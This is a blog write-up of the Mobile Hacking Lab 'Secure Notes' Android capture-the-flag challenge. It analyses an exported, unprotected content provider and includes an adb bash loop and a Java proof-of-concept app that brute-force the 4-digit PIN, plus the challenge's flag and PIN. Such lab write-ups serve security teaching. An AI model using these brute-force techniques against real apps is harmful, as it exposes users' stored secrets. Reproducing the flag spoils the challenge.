---
title:  "Mobile Hacking Lab Secure Notes Writeup"
date:   2024-01-22T16:32:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [Secure Notes](https://www.mobilehackinglab.com/course/lab-secure-notes) challenge from Mobile Hacking Lab. 

## Static Analysis
When we open the app in emulator, it opens a pin submission screen and it accept maximum 4 digit pins. We need to find correct pin. Let's open apk with jadx to understand the app.

![](./assets/images_mhl_securenotes/manifest.png)

When we examine the manifest file, we see that we have one activity(MainActivity). Also we have one exported content provider without any permission definition. It means that any application can query data from this provider☠️ Lets start our analyze with MainActivity.

### MainActivity

![](./assets/images_mhl_securenotes/provider1.png)

When we entered a pin, application calls `querySecretProvider` method with entered pin value. This method creates the selection variable by appending the given pin value after the "pin=" string. After that it send queries to provider that's defines inside itself with `content://com.mobilehackinglab.securenotes.secretprovider` uri. If returned value is not null, it prints the returned data to screen. Let's continue with the content provider to understand what the hack is going on when we make queries to that.

### SecretDataProvider

![](./assets/images_mhl_securenotes/provider2.png)

Inside th onCreate method, app reads some values from `config.properties` file that stored in assets folder. As their names suggest(encryptedSecret, salt, iv, iteratonCount), these should be values ​​related to encryption.

```properties
# content of config.properties file

encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```

![](./assets/images_mhl_securenotes/provider3.png)

When we query a data from content provider, this `query` method runs. It gets entered pin from "selection" variable that we send and sends this pin value to `decryptSecret` method.

![](./assets/images_mhl_securenotes/decrypt.png)

`decryptSecret` method uses given pin for generating a key and with that key it tries to decrypt encrypted string read from properties file. For finding a true pin, we can make bruteforce with 4 digit numbers. I tried it with adb with this script:
```bash
# https://stackoverflow.com/questions/27988069/query-android-content-provider-from-command-line-adb-shell
for i in {0001..9999}; do
    echo -n $i" ";adb shell content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=$i;
    
done
```

After big amount of time it gives a flag✨✨

![](./assets/images_mhl_securenotes/flag_adb.png)

```
pin: 2580
flag: CTF{D1d_y0u_gu3ss_1t!1?}
```

If you want to create an app for exploiting this vulnerability, here is my poc app code:

```java
//MainActivity
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
        for(int i =0;i<10000;i++){
            String selection = "pin=" + String.format("%04d",i);
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if(cursor != null){
                while (cursor.moveToNext()){
                    int index = Integer.valueOf(cursor.getColumnIndex("Secret"));
                    String result = cursor.getString(index);
                    Log.d("RESULT", i + " : " + result);
                }
            }
        }
    }
}
```
```xml
Add this lines to AndroidManifest.xml

<queries>
        <package android:name="com.mobilehackinglab.securenotes"></package>
</queries>
```

![](./assets/images_mhl_securenotes/app.png)

After amount of time, we see the flag🎉🎉🎉

Thanks for reading! See you in next writeups 👋🏻👋🏻